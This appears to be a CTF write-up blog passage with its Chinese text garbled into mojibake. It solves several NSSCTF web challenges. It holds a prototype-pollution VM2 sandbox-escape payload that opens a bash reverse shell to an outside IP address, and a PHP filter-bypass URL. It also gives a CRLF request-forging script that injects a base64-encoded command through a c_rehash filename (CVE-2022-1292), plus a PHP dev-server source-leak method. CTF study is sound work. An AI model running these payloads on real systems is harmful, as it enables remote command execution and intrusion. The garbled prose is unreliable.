<p>å‘ç°ä¸€ä¸ªmergeå‡½æ•°ï¼ŒåŸå‹é“¾æ±¡æŸ“çš„å¸¸å®¢ï¼Œå¤§æ¦‚å°±æ˜¯åœ¨é¡µé¢postä¼ é€’ä¸€ä¸ªjsonæ•°æ®ï¼Œä¼šç»è¿‡json.parseå‡½æ•°è§£æï¼Œç„¶åå†é€šè¿‡clone()å‡½æ•°å¤åˆ¶åˆ°copybodyå˜é‡ä¸­ï¼Œæœ€ååˆ¤æ–­è¯¥å˜é‡çš„shitå€¼æ˜¯å¦ä¸ºçœŸï¼Œç„¶åè°ƒç”¨backdoor()å‡½æ•°åœ¨VM2æ²™ç®±ä¸­æ‰§è¡Œ{}.shellcodeå±æ€§ã€‚</p>
<p>backdoorå‡½æ•°åˆ©ç”¨vm2æ‰§è¡Œshellcodeï¼Œè¿™ä¸ªshellcodeå…¶ä»–åœ°æ–¹æ²¡æœ‰å¾—ä¼ å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ä¼ é€’shellcodeï¼Œæ±¡æŸ“æˆVM2æ²™ç®±é€ƒé€¸çš„payloadå³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27;\&quot;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png" alt="image-20241224110506682" style="zoom: 67%;" />

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png" alt="image-20241224110501121" style="zoom:67%;" />

<p>æ‹¿ä¸‹ï¼Œå½“åˆvm2æ²¡çœ‹å•Šï¼ï¼</p>
<h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28575/index.php/utils.php/%81?show[source=1</span><br></pre></td></tr></table></figure>

<p>â€‹	å¥½åƒä¹Ÿå¯ä»¥urlç¼–ç ç»•è¿‡ï¼Ÿï¼</p>
<h2 id="FSCTF-2023-ç­¾åˆ°plus"><a href="#FSCTF-2023-ç­¾åˆ°plus" class="headerlink" title="[FSCTF 2023]ç­¾åˆ°plus"></a>[FSCTF 2023]ç­¾åˆ°plus</h2><p>æ‰«æºç æ‰«åˆ°ä¸€ä¸ªshell.php</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png" alt="image-20241225153946378" style="zoom:80%;" />

<p>ç„¶åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå‡çš„flag</p>
<p>å»æŸ¥ä¸€ä¸€ä¸‹è¿™ä¸ªphpç‰ˆæœ¬ï¼Œå‘ç°æœ‰æ¼æ´</p>
<p>PHPï¼œ&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´</p>
<p>PHP&lt;&#x3D;7.4.21æ—¶é€šè¿‡<code>php -S</code>å¼€èµ·çš„WEBæœåŠ¡å™¨å­˜åœ¨æºç æ³„éœ²æ¼æ´ï¼Œå¯ä»¥å°†PHPæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶ç›´æ¥è¾“å‡ºæºç </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060/article/details/129350280</a></p>
<p><a target="_blank" rel="noopener" href="https://buaq.net/go-147962.html">https://buaq.net/go-147962.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åŸç†ï¼š</span><br><span class="line">  è¿™é‡Œæˆ‘ä»¬ç¨å¾®è§£é‡Šä¸€ä¸‹ç¬¬ä¸€ä¸ªGETå’Œç¬¬äºŒä¸ªGETçš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆ</span><br><span class="line">        ç¬¬ä¸€ä¸ªGETåçš„/phpinfo.phpæ˜¯ç›´æ¥è®¿é—®å·²å­˜åœ¨çš„phpinfo.phpæ–‡ä»¶(ä¸€èˆ¬å¯ä»¥æ˜¯è®¿é—®index.php)</span><br><span class="line">PHPæºç ä¸­çš„php_cli_server_request_translate_vpathå‡½æ•°å°†è¯·æ±‚çš„PHPæ–‡ä»¶çš„è·¯å¾„è½¬æ¢ä¸ºæ–‡ä»¶ç³»ç»Ÿä¸Šçš„å®Œæ•´è·¯å¾„ã€‚å¦‚æœè¯·æ±‚çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç´¢å¼•æ–‡ä»¶ï¼Œå¦‚index.phpæˆ– index.htmlï¼Œå¹¶ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„(å¦‚æœæ‰¾åˆ°çš„è¯)ã€‚è¿™å…è®¸æœåŠ¡å™¨å“åº”è¯·æ±‚æä¾›æ­£ç¡®çš„æ–‡ä»¶</span><br><span class="line">        è€Œç¬¬äºŒä¸ªGETåçš„/è¯·æ±‚çš„æ˜¯ç›®å½•è€Œä¸æ˜¯æ–‡ä»¶ã€‚æ­¤PHPç‰ˆæœ¬æä¾›çš„ä»£ç åŒ…æ‹¬ä¸€ä¸ªæ£€æŸ¥ï¼Œä»¥ç¡®å®šè¯·æ±‚çš„æ–‡ä»¶æ˜¯åº”è¢«è§†ä¸ºé™æ€æ–‡ä»¶è¿˜æ˜¯ä½œä¸ºPHPæ–‡ä»¶æ‰§è¡Œã€‚è¿™æ˜¯é€šè¿‡æ£€æŸ¥æ–‡ä»¶çš„æ‰©å±•åæ¥å®Œæˆçš„ã€‚å¦‚æœæ‰©å±•ä¸æ˜¯.phpæˆ–.PHPï¼Œæˆ–è€…å¦‚æœæ‰©å±•åçš„é•¿åº¦ä¸ç­‰äº3,åˆ™è¯¥æ–‡ä»¶è¢«è§†ä¸ºé™æ€æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŠŠç¬¬äºŒä¸ªGETè¯·æ±‚çš„å†…å®¹æ”¹ä¸ºç±»ä¼¼1.txtçš„æ–‡ä»¶æ—¶ï¼Œphpæºç å°†ä¼šè¢«ä»¥é™æ€æ–‡ä»¶çš„æ–¹å¼æ³„éœ²(å³ç›´æ¥è®¿é—®è·å–)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png" alt="image-20241225155117505"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png" alt="image-20241225155204995"></p>
<p>ç›´æ¥æ‹¿ä¸‹äº†ã€‚</p>
<h2 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h2><p>ç»™äº†æˆ‘ä»¬æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">	oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">		c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.String(<span class="number">200</span>, newname)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">	router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çœ‹ä¸€ä¸ªpythonæ–‡ä»¶å’Œä¸€ä¸ªgoæ–‡ä»¶ï¼Œå…ˆåˆ†æä¸€ä¸‹åŠŸèƒ½ç‚¹</p>
<p>å…ˆçœ‹pythonæ–‡ä»¶ï¼Œ&#x2F;getcrtè·¯ç”±æ˜¯ç”Ÿæˆä¸€ä¸ªcrtè¯ä¹¦å¹¶returnç»™æˆ‘ä»¬ï¼Œ&#x2F;createlinkæ˜¯ä¸€ç§å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c_rehash static/crt/ &amp;&amp; ls static/crt/</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨äº†c_rehashè¿›è¡Œæ‰§è¡Œã€‚è¿™é‡Œc_rehashå…¶å®å­˜åœ¨CVE-2022-1292ã€‚</p>
<p>c_rehashæ˜¯opensslä¸­çš„ä¸€ä¸ªç”¨perlç¼–å†™çš„è„šæœ¬å·¥å…·ï¼Œç”¨äºæ‰¹é‡åˆ›å»ºè¯ä¹¦ç­‰æ–‡ä»¶ hashå‘½åçš„ç¬¦å·é“¾æ¥ï¼Œæ˜¯å½“ç”¨æˆ·å¯æ§æ–‡ä»¶åæ—¶çš„å‘½ä»¤æ³¨å…¥</p>
<p>ä»–ä¼šæ‰§è¡Œæ–‡ä»¶åçš„å†…å®¹ï¼Œå½“æ–‡ä»¶åå­˜åœ¨åå¼•å·æ—¶ï¼</p>
<p>cveåˆ†æï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox">https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox</a></p>
<p>ç„¶åçœ‹&#x2F;proxyï¼Œä¸è‡ªèº«çš„8887ç«¯å£å»ºç«‹è¿æ¥ï¼Œ8887ç«¯å£å¯¹åº”goæœåŠ¡ï¼Œå°†ä¸¤ç§è¯­è¨€è”ç³»åœ¨äº†ä¸€èµ·ã€‚è¿™é‡Œçš„uriæ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡CRLFæ„é€ ä»»æ„æ•°æ®åŒ…ã€‚æˆ‘ä»¬ä¹Ÿå¿…é¡»è¦CRLFæ¥æ„é€ ï¼Œå› ä¸ºå­˜åœ¨c.Request.URL.RawPath !&#x3D; â€œâ€ &amp;&amp; c.Request.Host &#x3D;&#x3D; â€œadminâ€</p>
<p><strong>goçš„RawPathç‰¹æ€§ï¼š</strong></p>
<p>é€šè¿‡é˜…è¯»go netåº“çš„æºç <br>æˆ‘å‘ç°åœ¨goä¸­ä¼šå¯¹åŸå§‹urlè¿›è¡Œåè½¬ä¹‰æ“ä½œ(URLè§£ç )<br>å¦‚æœåè½¬ä¹‰åå†æ¬¡è½¬ä¹‰çš„urlä¸åŸå§‹urlä¸åŒ é‚£ä¹ˆRawPathä¼šè¢«è®¾ç½®ä¸ºåŸå§‹url åä¹‹ç½®ä¸ºç©º</p>
<p>å› æ­¤æˆ‘ä»¬åªè¦éšä¾¿å¯¹ä¸€ä¸ªæ–œæ è¿›è¡Œurlç¼–ç å³å¯ã€‚</p>
<p>ç„¶åå°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®åŒ…äº†ã€‚ç„¶åé€šè¿‡è¡¨å•ä¼ å…¥uriå³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">uri=<span class="string">&#x27;&#x27;&#x27;/admin%2frename?oldname=b58a6a37-6cc5-46bf-a98f-d589a9957a1f.crt&amp;newname=`echo%20bHMgLw==|base64%20-d|bash&gt;flag`.crt HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">gopher = uri.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload=urllib.parse.quote(gopher)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„çš„ä½œç”¨æ˜¯ls &#x2F;</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png" alt="image-20241227153626689" style="zoom: 67%;" />

<p>æˆåŠŸå&#x2F;createlinkä¸€ä¸‹è®©ä»–æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ç„¶åå»&#x2F;static&#x2F;crt&#x2F;è®¿é—®å³å¯</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png" alt="image-20241227153710490" style="zoom:80%;" />

<p>åŒç†å¯è¯»flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;ee493ebd-0ef5-4594-baa9-ec7ad1a5f601&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨"><a href="#ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨"></a>[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨</h2><p>ç»™äº†æºç ï¼š</p>
